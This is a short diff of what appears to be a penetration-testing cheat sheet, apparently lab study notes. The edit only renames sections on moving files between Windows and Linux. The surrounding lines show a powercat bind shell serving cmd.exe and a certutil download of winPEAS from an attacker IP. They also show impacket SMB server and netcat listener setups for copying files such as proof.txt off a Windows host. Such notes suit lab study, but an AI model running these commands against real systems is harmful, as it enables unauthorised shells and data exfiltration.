@@ -132,9 +132,8 @@ powercat -l -p 443 -e cmd.exe   # bind shell
 ```
 certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
 
---------Windows to Linux----------
-Method 1:
-SMB method: 
+--------Windows to Linux (SMB)----------
+Method 1: 
 On kali: impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
 On windows:
 $pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
@@ -148,8 +147,7 @@ smbserver.py [share_name] [folder_path]
 on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
 copy [file to transfer] \\[linux ip]\[share_name]\[output file name]
 
-
-Via Powercat:
+--------Windows to Linux (PowerCat)----------
 on Linux: 
 sudo nc -lnvp 443 > receiving_powercat.ps1
 
